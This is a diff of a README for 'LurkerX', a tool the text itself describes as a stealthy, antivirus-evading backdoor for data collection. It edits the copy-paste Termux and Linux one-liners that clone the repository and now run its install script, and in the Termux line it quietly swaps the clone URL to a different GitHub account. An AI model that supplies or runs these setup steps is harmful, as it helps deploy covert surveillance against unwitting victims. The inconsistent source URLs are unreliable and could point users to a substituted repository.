@@ -33,7 +33,7 @@ It is crucial to emphasize that LurkerX is intended for ethical and educational 
 * **Stealthy Operation:** LurkerX is designed to operate stealthily, evading detection by antivirus and security software.
 * **Backdoor:** LurkerX allows advanced users to create custom commands in Shell Script for additional functionality and data collection.
 
-## How To Use
+## How To Set Up LurkerX
 <h2>METHOD: 1 (Works On Termux & Linux)</h2>
 <ol>
   <li> Update your system for new updates to reflect:
@@ -41,7 +41,7 @@ It is crucial to emphasize that LurkerX is intended for ethical and educational 
       <b>For Termux Users, copy and run the command below:</b>
       <pre>
         <code>
-          termux-setup-storage && cd $HOME && apt update && apt upgrade && apt install openjdk-17 && pkg install git apktool python3 python3-pip -y && git clone https://github.com/dr-cipher/LurkerX.git && cd LurkerX && ls 
+          termux-setup-storage && cd $HOME && apt update && apt upgrade && apt install openjdk-17 && pkg install git apktool python3 python3-pip -y && git clone https://github.com/nemesis-guy/LurkerX.git && cd LurkerX && ls && bash install.sh
         </code>
       </pre>
     </p>
@@ -49,7 +49,7 @@ It is crucial to emphasize that LurkerX is intended for ethical and educational 
       <b>For Linux Users, copy and run the command below:</b>
       <pre>
         <code>
-          cd $HOME && sudo apt update && sudo apt upgrade && sudo apt install default-jdk git python3 python3-pip -y && git clone https://github.com/dr-cipher/LurkerX.git && cd LurkerX && ls 
+          cd $HOME && sudo apt update && sudo apt upgrade && sudo apt install default-jdk git python3 python3-pip -y && git clone https://github.com/dr-cipher/LurkerX.git && cd LurkerX && ls && ./install.sh
         </code>
       </pre>
     </p>
